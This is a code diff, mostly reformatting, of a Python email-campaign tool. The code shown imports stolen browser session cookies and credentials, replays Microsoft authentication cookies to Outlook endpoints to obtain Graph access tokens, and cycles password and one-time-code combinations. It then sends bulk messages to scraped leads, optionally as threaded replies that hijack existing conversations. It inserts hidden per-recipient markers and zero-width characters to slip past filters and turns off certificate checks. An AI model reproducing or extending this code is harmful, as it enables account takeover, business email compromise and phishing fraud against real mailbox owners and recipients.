-            if re.search(r'<body[^>]*>', html, re.I):
-                html = re.sub(r'(<body(?:[^>]*)>)', rf'\1{_top_cmt}', html, count=1, flags=re.I)
+            _top_cmt = f"<!--r:{_uhash[:8]}-->"
+            if re.search(r"<body[^>]*>", html, re.I):
+                html = re.sub(
+                    r"(<body(?:[^>]*)>)", rf"\1{_top_cmt}", html, count=1, flags=re.I
+                )
             else:
                 html = _top_cmt + html
             _bot_div = (
                 f'<div style="display:none;font-size:1px;line-height:1px;'
                 f'max-height:0;max-width:0;opacity:0;overflow:hidden"><!--m:{_uhash[8:16]}--></div>'
             )
-            if re.search(r'</body>', html, re.I):
-                html = re.sub(r'</body>', f'{_bot_div}</body>', html, count=1, flags=re.I)
+            if re.search(r"</body>", html, re.I):
+                html = re.sub(
+                    r"</body>", f"{_bot_div}</body>", html, count=1, flags=re.I
+                )
             else:
                 html += _bot_div
         if plain:
             _pt_pos = int(_uhash[16:20], 16) % max(1, len(plain))
-            plain = plain[:_pt_pos] + '‌' + plain[_pt_pos:]
+            plain = plain[:_pt_pos] + "‌" + plain[_pt_pos:]
 
     if attachments:
         root = MIMEMultipart("mixed")
-        alt  = MIMEMultipart("alternative")
+        alt = MIMEMultipart("alternative")
         alt.attach(MIMEText(plain or "", "plain", "utf-8"))
-        alt.attach(MIMEText(html  or "", "html",  "utf-8"))
+        alt.attach(MIMEText(html or "", "html", "utf-8"))
         root.attach(alt)
         for att in attachments:
             mime_type = att.get("mime", "application/octet-stream")
-            mt, st = (mime_type.split("/", 1) if "/" in mime_type
-                      else ("application", "octet-stream"))
+            mt, st = (
+                mime_type.split("/", 1)
+                if "/" in mime_type
+                else ("application", "octet-stream")
+            )
             part = MIMEBase(mt, st)
             part.set_payload(att["data"])
             _enc.encode_base64(part)
-            part.add_header("Content-Disposition", "attachment",
-                            filename=att.get("filename", "attachment"))
+            part.add_header(
+                "Content-Disposition",
+                "attachment",
+                filename=att.get("filename", "attachment"),
+            )
             root.attach(part)
     else:
         root = MIMEMultipart("alternative")
         root.attach(MIMEText(plain or "", "plain", "utf-8"))
-        root.attach(MIMEText(html  or "", "html",  "utf-8"))
+        root.attach(MIMEText(html or "", "html", "utf-8"))
 
     from_str = f'"{from_name}" <{from_email}>' if from_name else from_email
-    to_str   = f'"{to_name}" <{to_email}>'     if to_name   else to_email
+    to_str = f'"{to_name}" <{to_email}>' if to_name else to_email
 
-    root["From"]       = from_str
-    root["To"]         = to_str
-    root["Subject"]    = subject
-    root["Date"]       = email.utils.formatdate(localtime=False)
+    root["From"] = from_str
+    root["To"] = to_str
+    root["Subject"] = subject
+    root["Date"] = email.utils.formatdate(localtime=False)
     root["Message-ID"] = email.utils.make_msgid(
         domain=from_email.split("@")[-1] if "@" in from_email else "example.com"
     )
@@ -2374,19 +2975,19 @@ def _build_mime(
         if not mid.startswith("<"):
             mid = f"<{mid}>"
         root["In-Reply-To"] = mid
-        root["References"]  = mid
+        root["References"] = mid
 
     return root
 
 
 def _send_via_smtp(
-    msg:       MIMEMultipart,
+    msg: MIMEMultipart,
     from_email: str,
-    to_email:   str,
-    smtp_host:  str,
-    smtp_port:  int,
-    username:   str,
-    password:   str,
+    to_email: str,
+    smtp_host: str,
+    smtp_port: int,
+    username: str,
+    password: str,
     is_godaddy: bool = False,
 ) -> tuple:
     """
@@ -2399,7 +3000,7 @@ def _send_via_smtp(
     """
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
-    ctx.verify_mode    = ssl.CERT_NONE
+    ctx.verify_mode = ssl.CERT_NONE
 
     # GoDaddy override
     if is_godaddy:
@@ -2408,8 +3009,7 @@ def _send_via_smtp(
 
     try:
         if smtp_port == 465:
-            server = smtplib.SMTP_SSL(smtp_host, smtp_port,
-                                      context=ctx, timeout=30)
+            server = smtplib.SMTP_SSL(smtp_host, smtp_port, context=ctx, timeout=30)
         else:
             server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
             server.ehlo()
@@ -2432,7 +3032,11 @@ def _send_via_smtp(
 
     except smtplib.SMTPAuthenticationError as exc:
         code = exc.smtp_code
-        detail = (exc.smtp_error or b"").decode(errors="replace") if isinstance(exc.smtp_error, bytes) else str(exc.smtp_error)
+        detail = (
+            (exc.smtp_error or b"").decode(errors="replace")
+            if isinstance(exc.smtp_error, bytes)
+            else str(exc.smtp_error)
+        )
         hint = ""
         if code == 535:
             hint = " — wrong password or app password required"
@@ -2444,7 +3048,10 @@ def _send_via_smtp(
         return False, f"Recipient refused: {exc}"
 
     except smtplib.SMTPSenderRefused as exc:
-        return False, f"Sender refused — your From address may not match authenticated account: {exc}"
+        return (
+            False,
+            f"Sender refused — your From address may not match authenticated account: {exc}",
+        )
 
     except smtplib.SMTPDataError as exc:
         return False, f"SMTP data error {exc.smtp_code}: {exc.smtp_error}"
@@ -2460,14 +3067,14 @@ def _send_via_smtp(
 
 
 def _send_via_graph(
-    token:        str,
-    to_email:     str,
-    subject:      str,
-    html:         str,
-    plain:        str,
-    from_name:    str        = "",
-    reply_to_mid: str        = "",
-    attachments:  list       = None,
+    token: str,
+    to_email: str,
+    subject: str,
+    html: str,
+    plain: str,
+    from_name: str = "",
+    reply_to_mid: str = "",
+    attachments: list = None,
 ) -> tuple:
     """
     Send via Microsoft Graph API /me/sendMail.
@@ -2485,7 +3092,7 @@ def _send_via_graph(
 
     h = {
         "Authorization": f"Bearer {token}",
-        "Content-Type":  "application/json",
+        "Content-Type": "application/json",
     }
 
     # Build body
@@ -2494,11 +3101,9 @@ def _send_via_graph(
             "subject": subject,
             "body": {
                 "contentType": "html",
-                "content":     html or "",
+                "content": html or "",
             },
-            "toRecipients": [
-                {"emailAddress": {"address": to_email}}
-            ],
+            "toRecipients": [{"emailAddress": {"address": to_email}}],
             # Graph doesn't expose In-Reply-To via standard fields,
             # but we can set it via singleValueExtendedProperties (MAPI)
         },
@@ -2508,9 +3113,7 @@ def _send_via_graph(
     # From display name override (Graph uses the account's configured name
     # but we can override via from field if the account has SendAs permission)
     if from_name:
-        payload["message"]["from"] = {
-            "emailAddress": {"name": from_name}
-        }
+        payload["message"]["from"] = {"emailAddress": {"name": from_name}}
 
     # Reply threading via MAPI extended property
     if reply_to_mid:
@@ -2519,7 +3122,7 @@ def _send_via_graph(
             mid = f"<{mid}>"
         payload["message"]["singleValueExtendedProperties"] = [
             {
-                "id":    "String 0x1042",   # PR_IN_REPLY_TO_ID
+                "id": "String 0x1042",  # PR_IN_REPLY_TO_ID
                 "value": mid,
             },
         ]
@@ -2531,21 +3134,22 @@ def _send_via_graph(
     # Attachments
     if attachments:
         att_list = []
-        for att in (attachments or []):
+        for att in attachments or []:
             data = att.get("data", b"")
             if isinstance(data, str):
                 data = data.encode()
-            att_list.append({
-                "@odata.type": "#microsoft.graph.fileAttachment",
-                "name":         att.get("filename", "attachment"),
-                "contentType":  att.get("mime", "application/octet-stream"),
-                "contentBytes": base64.b64encode(data).decode("ascii"),
-            })
+            att_list.append(
+                {
+                    "@odata.type": "#microsoft.graph.fileAttachment",
+                    "name": att.get("filename", "attachment"),
+                    "contentType": att.get("mime", "application/octet-stream"),
+                    "contentBytes": base64.b64encode(data).decode("ascii"),
+                }
+            )
         payload["message"]["attachments"] = att_list
 
     try:
-        r = _req.post(f"{GRAPH}/me/sendMail", headers=h,
-                      json=payload, timeout=45)
+        r = _req.post(f"{GRAPH}/me/sendMail", headers=h, json=payload, timeout=45)
         if r.status_code in (200, 202):
             return True, ""
         try:
@@ -2567,20 +3171,20 @@ def _send_via_graph(
 
 
 def send_b2b(
-    account:     B2BAccount,
-    leads:       list,
-    html:        str,
-    subject:     str,
-    plain:       str          = "",
-    mode:        str          = "new",       # "reply" | "new"
-    from_name:   str          = "",
-    from_email:  str          = "",
-    attachments: list         = None,
-    delay:       float        = 1.5,
-    jitter:      float        = 1.0,
-    batch_size:  int          = 0,
-    batch_delay: float        = 30.0,
-    max_sends:   int          = 0,
+    account: B2BAccount,
+    leads: list,
+    html: str,
+    subject: str,
+    plain: str = "",
+    mode: str = "new",  # "reply" | "new"
+    from_name: str = "",
+    from_email: str = "",
+    attachments: list = None,
+    delay: float = 1.5,
+    jitter: float = 1.0,
+    batch_size: int = 0,
+    batch_delay: float = 30.0,
+    max_sends: int = 0,
 ) -> Generator:
     """
     Generator — sends to each B2BLead, yields progress events.
@@ -2599,32 +3203,32 @@ def send_b2b(
         Clean message, no threading headers
     """
     actual_from = from_email or account.email
-    actual_name = from_name  or ""
-    atts        = attachments or []
-    cap         = max_sends if max_sends > 0 else len(leads)
-    is_ms       = bool(account.ms_token) and account.provider.get("type") == "ms"
-    is_godaddy  = account.provider.get("is_godaddy", False)
+    actual_name = from_name or ""
+    atts = attachments or []
+    cap = max_sends if max_sends > 0 else len(leads)
+    is_ms = bool(account.ms_token) and account.provider.get("type") == "ms"
+    is_godaddy = account.provider.get("is_godaddy", False)
 
     success_cnt = fail_cnt = 0
 
     for i, lead in enumerate(leads[:cap]):
         subj = _make_reply_subject(lead.last_subject) if mode == "reply" else subject
-        mid  = lead.message_id if mode == "reply" else ""
+        mid = lead.message_id if mode == "reply" else ""
 
         # Build MIME (used for SMTP; Graph uses JSON payload)
         mime_msg = _build_mime(
-            from_email   = actual_from,
-            from_name    = actual_name,
-            to_email     = lead.email,
-            to_name      = lead.name,
-            subject      = subj,
-            html         = html,
-            plain        = plain,
-            reply_to_mid = mid,
-            attachments  = atts,
+            from_email=actual_from,
+            from_name=actual_name,
+            to_email=lead.email,
+            to_name=lead.name,
+            subject=subj,
+            html=html,
+            plain=plain,
+            reply_to_mid=mid,
+            attachments=atts,
         )
 
-        ok  = False
+        ok = False
         err = ""
         via = ""
 
@@ -2632,40 +3236,46 @@ def send_b2b(
             # Refresh token if expiring
             if account.ms_refresh and not account.ms_token_valid():
                 new_tok, new_ref, new_exp, rerr = _ms_refresh_token(
-                    account.ms_refresh, account.email,
+                    account.ms_refresh,
+                    account.email,
                 )
                 if new_tok:
-                    account.ms_token         = new_tok
-                    account.ms_refresh       = new_ref
+                    account.ms_token = new_tok
+                    account.ms_refresh = new_ref
                     account.ms_token_expires = new_exp
                 else:
-                    yield {"type": "error", "index": i + 1, "total": cap,
-                           "email": lead.email, "error": f"Token refresh failed: {rerr}"}
+                    yield {
+                        "type": "error",
+                        "index": i + 1,
+                        "total": cap,
+                        "email": lead.email,
+                        "error": f"Token refresh failed: {rerr}",
+                    }
                     fail_cnt += 1
                     continue
 
             ok, err = _send_via_graph(
-                token        = account.ms_token,
-                to_email     = lead.email,
-                subject      = subj,
-                html         = html,
-                plain        = plain,
-                from_name    = actual_name,
-                reply_to_mid = mid,
-                attachments  = atts,
+                token=account.ms_token,
+                to_email=lead.email,
+                subject=subj,
+                html=html,
+                plain=plain,
+                from_name=actual_name,
+                reply_to_mid=mid,
+                attachments=atts,
             )
             via = "MS Graph"
 
         elif account.imap_conn:
             ok, err = _send_via_smtp(
-                msg        = mime_msg,
-                from_email = actual_from,
-                to_email   = lead.email,
-                smtp_host  = account.smtp_host,
-                smtp_port  = account.smtp_port,
-                username   = account.smtp_user or account.email,
-                password   = account.smtp_pass,
-                is_godaddy = is_godaddy,
+                msg=mime_msg,
+                from_email=actual_from,
+                to_email=lead.email,
+                smtp_host=account.smtp_host,
+                smtp_port=account.smtp_port,
+                username=account.smtp_user or account.email,
+                password=account.smtp_pass,
+                is_godaddy=is_godaddy,
             )
             via = f"SMTP {account.smtp_host}"
 
@@ -2675,17 +3285,17 @@ def send_b2b(
         if ok:
             success_cnt += 1
             yield {
-                "type":  "success",
+                "type": "success",
                 "index": i + 1,
                 "total": cap,
                 "email": lead.email,
-                "via":   via,
+                "via": via,
                 "score": lead.score,
             }
         else:
             fail_cnt += 1
             yield {
-                "type":  "error",
+                "type": "error",
                 "index": i + 1,
                 "total": cap,
                 "email": lead.email,
@@ -2694,24 +3304,27 @@ def send_b2b(
 
         # Delay / batch pause
         if batch_size > 0 and (i + 1) % batch_size == 0 and (i + 1) < cap:
-            yield {"type": "batch",
-                   "msg": f"Batch {(i+1)//batch_size} done — pausing {batch_delay:.0f}s"}
+            yield {
+                "type": "batch",
+                "msg": f"Batch {(i + 1) // batch_size} done — pausing {batch_delay:.0f}s",
+            }
             time.sleep(batch_delay)
         else:
             jit = random.uniform(-jitter, jitter)
             time.sleep(max(0.1, delay + jit))
 
     yield {
-        "type":    "done",
+        "type": "done",
         "success": success_cnt,
-        "fail":    fail_cnt,
-        "total":   min(cap, len(leads)),
+        "fail": fail_cnt,
+        "total": min(cap, len(leads)),
     }
 
 
 # ═══════════════════════════════════════════════════════════════
 # HIGH-LEVEL SESSION WRAPPER
 # ═══════════════════════════════════════════════════════════════
+
 
 class B2BSession:
     """
@@ -2751,20 +3364,20 @@ class B2BSession:
 
     def __init__(self):
         self._s = {
-            "ms_token":         None,
+            "ms_token": None,
             "ms_token_expires": 0.0,
-            "ms_refresh":       None,
-            "imap_conn":        None,
-            "provider":         None,
-            "email":            None,
-            "smtp_host":        "",
-            "smtp_port":        587,
-            "smtp_pass":        "",
-            "raw_results":      [],
-            "leads":            [],
-            "device_flow":      None,
-            "device_app":       None,
-            "device_email":     None,
+            "ms_refresh": None,
+            "imap_conn": None,
+            "provider": None,
+            "email": None,
+            "smtp_host": "",
+            "smtp_port": 587,
+            "smtp_pass": "",
+            "raw_results": [],
+            "leads": [],
+            "device_flow": None,
+            "device_app": None,
+            "device_email": None,
         }
 
     # ── Provider detection ──────────────────────────────────────
@@ -2772,7 +3385,7 @@ class B2BSession:
     def detect(self, email_addr: str) -> dict:
         prov = detect(email_addr)
         self._s["provider"] = prov
-        self._s["email"]    = email_addr
+        self._s["email"] = email_addr
         return prov
 
     # ── Login: Method 1 — password ──────────────────────────────
@@ -2795,8 +3408,8 @@ class B2BSession:
         if prov["type"] in ("ms", "unknown"):
             tok, reftok, exp, err = login_ms_ropc(email_addr, password)
             if tok:
-                self._s["ms_token"]         = tok
-                self._s["ms_refresh"]       = reftok
+                self._s["ms_token"] = tok
+                self._s["ms_refresh"] = reftok
                 self._s["ms_token_expires"] = exp
                 return True, None
             # For unknown provider that ROPC failed — also try IMAP
@@ -2822,8 +3435,9 @@ class B2BSession:
 
     # ── Login: Method 2 — device code ──────────────────────────
 
-    def start_device_code(self, email_addr: str,
-                          custom_client_id: str = "", custom_tenant: str = "") -> Optional[dict]:
+    def start_device_code(
+        self, email_addr: str, custom_client_id: str = "", custom_tenant: str = ""
+    ) -> Optional[dict]:
         """
         Start Microsoft device code flow.
         Pass custom_client_id + custom_tenant for tenants with admin consent enforcement.
@@ -2833,9 +3447,12 @@ class B2BSession:
         self._s["email"] = email_addr
         self._s.pop("ms_token", None)
         self._s.pop("ms_token_expires", None)
-        return start_device_code(email_addr, self._s,
-                                 custom_client_id=custom_client_id,
-                                 custom_tenant=custom_tenant)
+        return start_device_code(
+            email_addr,
+            self._s,
+            custom_client_id=custom_client_id,
+            custom_tenant=custom_tenant,
+        )
 
     def poll_device_code(self) -> dict:
         """
@@ -2844,9 +3461,9 @@ class B2BSession:
         """
         result = poll_device_code(self._s)
         if result.get("ok"):
-            self._s["ms_token"]         = result.get("token")
+            self._s["ms_token"] = result.get("token")
             self._s["ms_token_expires"] = result.get("expires", 0.0)
-            self._s["ms_refresh"]       = self._s.get("ms_refresh_token")
+            self._s["ms_refresh"] = self._s.get("ms_refresh_token")
         return result
 
     # ── Login: Method 2c — password + TOTP/OTP ─────────────────
@@ -2869,13 +3486,16 @@ class B2BSession:
             for pw_attempt in [password, password + otp, otp]:
                 tok, reftok, exp, err = login_ms_ropc(email_addr, pw_attempt)
                 if tok:
-                    self._s["ms_token"]         = tok
-                    self._s["ms_refresh"]       = reftok
+                    self._s["ms_token"] = tok
+                    self._s["ms_refresh"] = reftok
                     self._s["ms_token_expires"] = exp
                     return {"ok": True, "email": email_addr, "method": "ropc_otp"}
                 if err in ("mfa_required", "federated"):
-                    return {"ok": False, "error": err,
-                            "message": "MFA required — use Device Code flow instead"}
+                    return {
+                        "ok": False,
+                        "error": err,
+                        "message": "MFA required — use Device Code flow instead",
+                    }
                 if err == "wrong_password":
                     break  # Don't waste attempts with wrong password
 
@@ -2935,31 +3555,56 @@ class B2BSession:
         # ── Step 1: detect provider early so we know what to try ─
         if not self._s.get("provider"):
             self._s["provider"] = detect(email_addr)
-        prov     = self._s["provider"]
-        prov_type = prov.get("type", "unknown")   # "ms", "imap", "unknown"
-        is_ms    = prov_type == "ms"
+        prov = self._s["provider"]
+        prov_type = prov.get("type", "unknown")  # "ms", "imap", "unknown"
+        is_ms = prov_type == "ms"
         is_google = prov.get("is_google", False)
 
         # ── Step 2: universal cookie/credential parser ────────────
-        cookie_dict  = {}   # name → value  (actual cookies)
-        extra_fields = {}   # meta: username, password, userAgent, etc.
+        cookie_dict = {}  # name → value  (actual cookies)
+        extra_fields = {}  # meta: username, password, userAgent, etc.
         domain_cookie_map = {}  # domain → [(name, value)] — preserves origin domain per cookie
         raw = cookies_raw.strip()
 
         # Meta-keys that are NOT cookies — strip from any exporter format
         _META = {
-            "username", "password", "useragent", "user_agent", "origin",
-            "referer", "host", "url", "title", "domain", "path", "expires",
-            "maxage", "httponly", "secure", "samesite", "size", "priority",
-            "sourcescheme", "sourceport", "partitionkey", "storeid",
-            "session", "id", "storeId", "sameSite", "httpOnly", "maxAge",
+            "username",
+            "password",
+            "useragent",
+            "user_agent",
+            "origin",
+            "referer",
+            "host",
+            "url",
+            "title",
+            "domain",
+            "path",
+            "expires",
+            "maxage",
+            "httponly",
+            "secure",
+            "samesite",
+            "size",
+            "priority",
+            "sourcescheme",
+            "sourceport",
+            "partitionkey",
+            "storeid",
+            "session",
+            "id",
+            "storeId",
+            "sameSite",
+            "httpOnly",
+            "maxAge",
         }
 
         def _absorb(obj: dict):
             for k, v in obj.items():
                 lk = k.lower()
                 if lk in _META:
-                    extra_fields[lk] = str(v) if isinstance(v, (str, int, float)) else ""
+                    extra_fields[lk] = (
+                        str(v) if isinstance(v, (str, int, float)) else ""
+                    )
                 elif isinstance(v, str) and v:
                     cookie_dict[k] = v
                 elif isinstance(v, dict) and "value" in v and str(v["value"]):
@@ -2968,7 +3613,7 @@ class B2BSession:
         # JSON
         if raw.startswith("[") or raw.startswith("{"):
             try:
-                parsed = json.loads(raw)
+                parsed = _json_mod.loads(raw)
             except Exception:
                 parsed = None
 
@@ -3009,8 +3654,14 @@ class B2BSession:
                             continue
                         for cookie_name, cookie_obj in domain_cookies.items():
                             if isinstance(cookie_obj, dict):
-                                val = cookie_obj.get("Value") or cookie_obj.get("value", "")
-                                name = cookie_obj.get("Name") or cookie_obj.get("name") or cookie_name
+                                val = cookie_obj.get("Value") or cookie_obj.get(
+                                    "value", ""
+                                )
+                                name = (
+                                    cookie_obj.get("Name")
+                                    or cookie_obj.get("name")
+                                    or cookie_name
+                                )
                             elif isinstance(cookie_obj, str):
                                 val = cookie_obj
                                 name = cookie_name
@@ -3020,9 +3671,9 @@ class B2BSession:
                                 cookie_dict[str(name)] = str(val)
                                 # Also track which domain each cookie belongs to
                                 # so we can replay them to the right endpoint
-                                domain_cookie_map.setdefault(domain.lstrip("."), []).append(
-                                    (str(name), str(val))
-                                )
+                                domain_cookie_map.setdefault(
+                                    domain.lstrip("."), []
+                                ).append((str(name), str(val)))
                     # Absorb meta fields (sessionId, userAgent, remoteAddr, etc.)
                     for k, v in parsed.items():
                         if k != "tokens" and isinstance(v, (str, int, float)):
@@ -3060,21 +3711,36 @@ class B2BSession:
                             cookie_dict[k] = v
 
         # Pull out credential fields regardless of format
-        cred_user = (extra_fields.get("username") or extra_fields.get("email") or email_addr).strip()
+        cred_user = (
+            extra_fields.get("username") or extra_fields.get("email") or email_addr
+        ).strip()
         cred_pass = extra_fields.get("password", "").strip()
 
         if not cookie_dict and not extra_fields:
-            return {"ok": False, "error": "Could not parse the pasted data — try Cookie Editor JSON export or a raw cookie header string"}
+            return {
+                "ok": False,
+                "error": "Could not parse the pasted data — try Cookie Editor JSON export or a raw cookie header string",
+            }
 
         # ── Step 3: bare Bearer/access token detection ────────────
         # User may paste the token directly, or it may be a cookie value
         bearer_token = None
-        if (len(raw) > 80 and not raw.startswith("{") and not raw.startswith("[")
-                and raw.count(".") == 2 and "\n" not in raw.strip()):
+        if (
+            len(raw) > 80
+            and not raw.startswith("{")
+            and not raw.startswith("[")
+            and raw.count(".") == 2
+            and "\n" not in raw.strip()
+        ):
             bearer_token = raw.strip()
         if not bearer_token:
-            for k in ("access_token", "token", "bearer", "Authorization",
-                      "x-ms-refreshtokencredential"):
+            for k in (
+                "access_token",
+                "token",
+                "bearer",
+                "Authorization",
+                "x-ms-refreshtokencredential",
+            ):
                 v = cookie_dict.pop(k, "") or extra_fields.get(k, "")
                 if v and len(v) > 60:
                     bearer_token = v.replace("Bearer ", "").strip()
@@ -3092,9 +3758,15 @@ class B2BSession:
             session = _req.Session()
             # Set cookies on all MS/O365 domains by default
             ms_domains = [
-                ".office365.com", "outlook.office365.com", ".outlook.office365.com",
-                ".microsoft.com", ".microsoftonline.com", ".live.com",
-                ".office.com", "login.microsoftonline.com", ".login.live.com",
+                ".office365.com",
+                "outlook.office365.com",
+                ".outlook.office365.com",
+                ".microsoft.com",
+                ".microsoftonline.com",
+                ".live.com",
+                ".office.com",
+                "login.microsoftonline.com",
+                ".login.live.com",
             ]
             for name, value in cookie_dict.items():
                 for domain in ms_domains:
@@ -3108,11 +3780,25 @@ class B2BSession:
                     session.cookies.set(name, value, domain="." + origin_domain)
 
             ms_auth_cookies = [
-                "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSSC",
-                "OIDCAuth", "sccauth", "MSPAuth", "MSNRPSPCAuth",
-                "RPSSecAuth", "x-ms-refreshtokencredential", "buid", "esctx",
-                "RpsContextCookie", "wlidperf", "MSCC", "MSPStts",
-                "SignInStateCookie", "fpc", "stsservicecookie",
+                "ESTSAUTH",
+                "ESTSAUTHPERSISTENT",
+                "ESTSAUTHLIGHT",
+                "ESTSSC",
+                "OIDCAuth",
+                "sccauth",
+                "MSPAuth",
+                "MSNRPSPCAuth",
+                "RPSSecAuth",
+                "x-ms-refreshtokencredential",
+                "buid",
+                "esctx",
+                "RpsContextCookie",
+                "wlidperf",
+                "MSCC",
+                "MSPStts",
+                "SignInStateCookie",
+                "fpc",
+                "stsservicecookie",
             ]
             found_ms_cookies = [c for c in ms_auth_cookies if c in cookie_dict]
             token = None
@@ -3129,9 +3815,14 @@ class B2BSession:
                 _UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
                 for name, value in ests_domain_cookies:
-                    for d in ("login.microsoftonline.com", ".login.microsoftonline.com",
-                              ".office365.com", "outlook.office365.com",
-                              ".outlook.office365.com", ".office.com"):
+                    for d in (
+                        "login.microsoftonline.com",
+                        ".login.microsoftonline.com",
+                        ".office365.com",
+                        "outlook.office365.com",
+                        ".outlook.office365.com",
+                        ".office.com",
+                    ):
                         ests_session.cookies.set(name, value, domain=d)
                 for name, value in cookie_dict.items():
                     ests_session.cookies.set(name, value, domain=".microsoft.com")
@@ -3147,12 +3838,17 @@ class B2BSession:
                     ]:
                         r_boot = ests_session.get(
                             _owa_url,
-                            headers={"User-Agent": _UA,
-                                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-                                     "Accept-Language": "en-US,en;q=0.9"},
-                            allow_redirects=True, timeout=25,
+                            headers={
+                                "User-Agent": _UA,
+                                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+                                "Accept-Language": "en-US,en;q=0.9",
+                            },
+                            allow_redirects=True,
+                            timeout=25,
                         )
-                        errors.append(f"OWA fetch {_owa_url[-20:]}: url={r_boot.url[-40:]} status={r_boot.status_code}")
+                        errors.append(
+                            f"OWA fetch {_owa_url[-20:]}: url={r_boot.url[-40:]} status={r_boot.status_code}"
+                        )
                         if r_boot.ok and "login.microsoftonline.com" not in r_boot.url:
                             break
 
@@ -3177,22 +3873,39 @@ class B2BSession:
                         if not token:
                             # Copy OWA session cookies that were set during the redirect chain
                             for _ck in ests_session.cookies:
-                                ests_session.cookies.set(_ck.name, _ck.value, domain="outlook.office365.com")
-                            for _owa_path in ["/owa/auth/oauthtoken", "/owa/0/oauthtoken"]:
+                                ests_session.cookies.set(
+                                    _ck.name, _ck.value, domain="outlook.office365.com"
+                                )
+                            for _owa_path in [
+                                "/owa/auth/oauthtoken",
+                                "/owa/0/oauthtoken",
+                            ]:
                                 try:
                                     rt = ests_session.post(
                                         f"https://outlook.office365.com{_owa_path}",
-                                        data={"resource": "https://graph.microsoft.com", "grant_type": "implicit"},
-                                        headers={"User-Agent": _UA,
-                                                 "Origin": "https://outlook.office365.com",
-                                                 "Referer": r_boot.url,
-                                                 "X-Requested-With": "XMLHttpRequest"},
+                                        data={
+                                            "resource": "https://graph.microsoft.com",
+                                            "grant_type": "implicit",
+                                        },
+                                        headers={
+                                            "User-Agent": _UA,
+                                            "Origin": "https://outlook.office365.com",
+                                            "Referer": r_boot.url,
+                                            "X-Requested-With": "XMLHttpRequest",
+                                        },
                                         timeout=15,
                                     )
-                                    errors.append(f"oauthtoken{_owa_path[-10:]}: {rt.status_code} {rt.text[:50]}")
+                                    errors.append(
+                                        f"oauthtoken{_owa_path[-10:]}: {rt.status_code} {rt.text[:50]}"
+                                    )
                                     if rt.ok:
-                                        token = rt.json().get("access_token") or rt.json().get("token") or rt.json().get("Token","")
-                                        if token: break
+                                        token = (
+                                            rt.json().get("access_token")
+                                            or rt.json().get("token")
+                                            or rt.json().get("Token", "")
+                                        )
+                                        if token:
+                                            break
                                 except Exception as e:
                                     errors.append(f"oauthtoken: {e}")
 
@@ -3203,15 +3916,25 @@ class B2BSession:
                                 "https://outlook.office365.com/owa/service.svc?action=GetAccessTokenforResource",
                             ]:
                                 try:
-                                    rs = ests_session.post(_sil_url,
-                                        json={"resource": "https://graph.microsoft.com"},
-                                        headers={"User-Agent": _UA, "Content-Type": "application/json",
-                                                 "Origin": "https://outlook.office365.com"},
-                                        timeout=12)
-                                    errors.append(f"silent {_sil_url[-30:]}: {rs.status_code} {rs.text[:50]}")
+                                    rs = ests_session.post(
+                                        _sil_url,
+                                        json={
+                                            "resource": "https://graph.microsoft.com"
+                                        },
+                                        headers={
+                                            "User-Agent": _UA,
+                                            "Content-Type": "application/json",
+                                            "Origin": "https://outlook.office365.com",
+                                        },
+                                        timeout=12,
+                                    )
+                                    errors.append(
+                                        f"silent {_sil_url[-30:]}: {rs.status_code} {rs.text[:50]}"
+                                    )
                                     if rs.ok:
-                                        token = rs.json().get("access_token","")
-                                        if token: break
+                                        token = rs.json().get("access_token", "")
+                                        if token:
+                                            break
                                 except Exception as e:
                                     errors.append(f"silent token: {e}")
 
@@ -3219,10 +3942,14 @@ class B2BSession:
                         if not token:
                             token = "OWA_SESSION"
                             _owa_session_for_imap = ests_session
-                            errors.append("OWA session established — using session auth")
+                            errors.append(
+                                "OWA session established — using session auth"
+                            )
 
                     elif "login.microsoftonline.com" in r_boot.url:
-                        errors.append("ESTS cookies rejected — redirected to login page")
+                        errors.append(
+                            "ESTS cookies rejected — redirected to login page"
+                        )
                 except Exception as e:
                     errors.append(f"ESTS OWA chain: {e}")
 
@@ -3231,14 +3958,18 @@ class B2BSession:
                 try:
                     r = session.post(
                         "https://outlook.office365.com/owa/auth/oauthtoken",
-                        data={"resource": "https://graph.microsoft.com", "grant_type": "implicit"},
+                        data={
+                            "resource": "https://graph.microsoft.com",
+                            "grant_type": "implicit",
+                        },
                         headers={
                             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                             "Accept": "application/json",
                             "Origin": "https://outlook.office365.com",
                             "Referer": "https://outlook.office365.com/mail/",
                         },
-                        timeout=15, allow_redirects=True,
+                        timeout=15,
+                        allow_redirects=True,
                     )
                     if r.ok:
                         j = r.json()
@@ -3250,10 +3981,13 @@ class B2BSession:
             if not token:
                 try:
                     import re as _re
+
                     r = session.get(
                         "https://outlook.office365.com/owa/?exsvurl=1",
-                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                                 "Accept": "text/html,application/xhtml+xml"},
+                        headers={
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                            "Accept": "text/html,application/xhtml+xml",
+                        },
                         timeout=20,
                     )
                     for pat in [
@@ -3274,20 +4008,27 @@ class B2BSession:
                 try:
                     r = session.get(
                         "https://graph.microsoft.com/v1.0/me?$select=displayName,mail",
-                        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
+                        headers={
+                            "User-Agent": "Mozilla/5.0",
+                            "Accept": "application/json",
+                        },
                         timeout=12,
                     )
                     if r.ok:
                         info = r.json()
                         if info.get("mail") or info.get("userPrincipalName"):
                             self._s["cookie_session"] = session
-                            self._s["email"] = email_addr or info.get("mail") or info.get("userPrincipalName", "")
+                            self._s["email"] = (
+                                email_addr
+                                or info.get("mail")
+                                or info.get("userPrincipalName", "")
+                            )
                             return {
-                                "ok":           True,
+                                "ok": True,
                                 "display_name": info.get("displayName", ""),
-                                "method":       "cookie_session",
-                                "inbox_count":  0,
-                                "note":         f"Authenticated via MS session cookies ({len(cookie_dict)} found)",
+                                "method": "cookie_session",
+                                "inbox_count": 0,
+                                "note": f"Authenticated via MS session cookies ({len(cookie_dict)} found)",
                             }
                 except Exception as e:
                     errors.append(f"Graph session: {e}")
@@ -3299,26 +4040,45 @@ class B2BSession:
             if token == "OWA_SESSION":
                 # We have a valid OWA session but couldn't extract a Bearer token.
